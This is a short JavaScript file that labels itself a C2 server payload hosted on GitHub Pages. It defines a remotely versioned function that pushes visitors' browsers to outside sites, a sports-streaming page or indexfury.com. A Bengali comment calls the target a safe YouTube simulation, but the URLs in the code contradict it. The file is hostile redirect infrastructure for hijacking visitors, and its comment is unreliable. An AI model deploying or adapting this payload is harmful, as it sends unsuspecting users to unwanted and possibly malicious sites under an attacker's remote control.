// ================================================================
// nrl.js - C2 Server Payload (Hosted on GitHub Pages)
// ================================================================

var CURRENT_PAYLOAD_VERSION = "v1"; 

window.C2_PAYLOAD_ACTION = function() {
    
    // 🎯 নিরাপদ রিডাইরেক্ট টার্গেট (সিমুলেশনের জন্য YouTube)
    var V1_REDIRECT_URL = "https://free-sports.netlify.app";
    var V2_REDIRECT_URL = "https://indexfury.com";
    
    if (CURRENT_PAYLOAD_VERSION === "v1") {
        // 🚀 V1:
        window.location.href = V1_REDIRECT_URL;
    } 
    else if (CURRENT_PAYLOAD_VERSION === "v2") {
        // 🚀 V2: 
        window.location.href = V2_REDIRECT_URL;
    } 
    else {
    }
};
